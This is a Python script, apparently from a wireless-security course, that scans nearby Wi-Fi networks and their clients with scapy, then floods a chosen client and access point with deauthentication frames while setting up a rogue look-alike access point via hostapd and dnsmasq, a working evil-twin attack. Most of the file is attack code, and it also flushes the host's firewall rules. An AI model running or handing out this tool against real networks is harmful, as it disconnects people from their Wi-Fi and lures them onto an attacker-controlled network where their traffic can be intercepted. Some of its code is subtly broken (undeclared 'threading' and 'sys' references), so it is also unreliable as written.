from scapy.all import *
from threading import Thread
import pandas
import time
import os

import warnings

from scapy.layers.dot11 import Dot11Beacon, Dot11, Dot11Elt, RadioTap, Dot11Deauth

warnings.filterwarnings('ignore')

# RUN EXAMPLE: sudo python3 WiFiScanner.py
# RUN EXAMPLE: sudo /bin/python3.8 /home/user/Documents/WiFiScanner.py
# (Should run with 'sudo')
# Sources can be found here: https://github.com/AlmogJakov/Protection-of-wireless-and-mobile-networks/blob/fc91a2ffe9c7dc98ee32072a3bc1d8fb9bb08943/WiFiScanner.py

stop_threads = False
# initialize the networks dataframe that will contain all access points nearby
cols = ['BSSID', 'SSID', 'dBm_Signal', 'Channel', 'Crypto']
networks = pandas.DataFrame(columns=cols, dtype=object)
user = {}


def callback(packet):
    frame = packet[Dot11]
    if packet.haslayer(Dot11Beacon):
        # Extract the MAC address of the network (address 2 = address mac of the transmitter)
        bssid = packet[Dot11].addr2
        if not networks.loc[networks["BSSID"].str.contains(bssid, case=False)].empty:
            return
        # Get the name of the network
        ssid = packet[Dot11Elt].info.decode()  # A Generic 802.11 Element
        try:
            dbm_signal = packet.dBm_AntSignal
        except:
            dbm_signal = "N/A"
        # Extract network stats (Dot11Beacon class extend _Dot11EltUtils class which contains 'network_stats' method)
        stats = packet[Dot11Beacon].network_stats()
        # Get the channel of the AP
        channel = stats.get("channel")
        # Get the crypto (the type of network encryption)
        crypto = stats.get("crypto")
        # Add the network to the global list
        networks.loc[len(networks.index)] = (bssid, ssid, dbm_signal, channel, crypto)
    # if the FCfield is "ToDS"
    elif frame.FCfield & 0b1 != 0:
        if frame.addr1 not in user:
            user[frame.addr1] = set()
        user[frame.addr1].add(frame.addr2)


def change_channel():
    ch = 1
    while True:
        os.system(f"iwconfig {interface} channel {ch}")
        # switch channel from 1 to 14 each 0.5s
        ch = ch % 14 + 1
        time.sleep(0.5)
        if stop_threads:
            break


def for_ap(frame, interface):
  while True:
    sendp(frame, iface = interface, count = 100, inter = 0.1)
def for_client(frame, interface):
  while True:
    sendp(frame, iface = interface, count = 100, inter = 0.1)

def openAP(net,target_mac,interface):
    # Source: https://hakin9.org/create-a-fake-access-point-by-anastasis-vasileiadis/

    # os.system("service apache2 start")
    # 1
    os.system("sudo apt-get update")
    # 2
    os.system("sudo apt-get install hostapd dnsmasq")

    # for clear port 53
    os.system('systemctl disable systemd-resolved.service >/dev/null 2>&1')
    os.system('systemctl stop systemd-resolved>/dev/null 2>&1')
    # 3
    # 5
    conf_text = f"interface={interface}\ndriver=nl80211\nssid={net['SSID']+'-check'}\nhw_mode=g"\
    f"\nchannel={net['Channel']}\nmacaddr_acl=0\nignore_broadcast_ssid=0\n"\
    "auth_algs=1\nieee80211n=1\nwme_enabled=1"
    conf_file = open("hostapd.conf", "w")
    n = conf_file.write(conf_text)
    conf_file.close()

    # 6
    os.system("hostapd hostapd.conf")

    # 7
    conf_text = f"interface={interface}\ndhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h"\
    "\ndhcp-option=3,192.168.1.1\ndhcp-option=6,192.168.1.1"\
    "\nserver=8.8.8.8\nlog-queries\nlog-dhcp\nlisten-address=127.0.0.1"
    conf_file = open("dnsmasq.conf", "w")
    n = conf_file.write(conf_text)
    conf_file.close()

    # 8
    os.system(f"ifconfig {interface} up 192.168.1.1 netmask 255.255.255.0")
    os.system("route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1")
    os.system("dnsmasq -C dnsmasq.conf -d")

    # 9
    # os.system(f"iptables --table nat --append POSTROUTING -out-interface {interface} -j MASQUERADE")
    # os.system(f"iptables --append FORWARD --in-interface {interface} -j ACCEPT")
    os.system('iptables --flush')
    os.system('iptables --table nat --flush')
    os.system('iptables --delete-chain')
    os.system('iptables --table nat --delete-chain')
    os.system('iptables -P FORWARD ACCEPT')

    # 10
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

   	# ### Enable and start the local DNS stub listener that uses port 53 
    os.system("systemctl enable systemd-resolved.service >/dev/null 2>&1") 
    os.system("systemctl start systemd-resolved >/dev/null 2>&1") 

    






    return 0

if __name__ == "__main__":

    # 1. Get network interface card names & print
    interfaces = os.listdir('/sys/class/net/')
    print("Interfaces:")
    for (i, item) in enumerate(interfaces, start=1):
        print("   " + str(i) + ". " + item)
    val = input("Please Choose Interface: ")

    # 2. Choose card interface to attack with
    while True:
        try:
            choose = int(val)
            interface = interfaces[choose - 1]
            break
        except:
            val = input("Please Choose Again: ")
    print('Looking for networks.....')

    # 3. Enable monitor mode
    os.system(f'sudo ifconfig {interface} down')
    os.system(f'sudo iwconfig {interface} mode monitor')
    os.system(f'sudo ifconfig {interface} up')

    # 4. Start the channel changer
    channel_changer = Thread(target=change_channel)
    channel_changer.daemon = True
    channel_changer.start()

    # 5. Start sniffing (Synchronous process)
    sniff(prn=callback, iface=interface, timeout=10)

    # 6. Stop printing and changing channel threads
    stop_threads = True

    # 7 Check if any clients found
    if networks.iloc[:, :]["BSSID"].empty:
        print("\nNo Networks Found! Aborting the process...")
        sys.exit(1)

    # 8. Choose the AP to attack
    print(networks.iloc[:, [0, 1]])
    val = input("\nPlease enter the index of the AP you want to attack: ")
    while True:
        try:
            net = networks.loc[int(val)]
        except:
            val = input("Please Choose Again Network: ")
            continue

        # 9. Print the Users
        i = 1
        gateway_mac = str(net[0])
        if gateway_mac in user:
            for n in user[gateway_mac]:
                print(str(i) + ' ' + n)
                i += 1
            break
        else:
            print('This network was no user:', gateway_mac)
            val = input("Please Choose Again Network: ")


    # 10. Choose the Client to attack
    val = input("\nPlease enter the index of the client you want to attack: ")
    while True:
        try:
            choose = int(val)
            break
        except:
            val = input("Please Choose Again: ")

    # 11. Get the Client we choose
    i = 1
    target_mac = ''
    for n in user[gateway_mac]:
        if i == choose:
            target_mac = n
            break
        i += 1

    # 11. User attack
    print('The target is: ', target_mac)
    print('Attack!!! :)')
    frame = RadioTap() / Dot11(addr1=gateway_mac, addr2=target_mac, addr3=target_mac) / Dot11Deauth(reason=1)
    frame1 = RadioTap() / Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth(reason=1)
    deauth1 = threading.Thread(target = for_ap, args = (frame, interface))
    deauth2 = threading.Thread(target = for_client, args = (frame1, interface))
    newAP = threading.Thread(target = openAP, args = (net, target_mac, interface))
    deauth1.start()
    deauth2.start()
    newAP.start()
    deauth1.join()
    deauth2.join()
    newAP.join()



    # 12. Disable monitor mode
    os.system(f'sudo ifconfig {interface} down')
    os.system(f'sudo iwconfig {interface} mode managed')
    os.system(f'sudo ifconfig {interface} up')
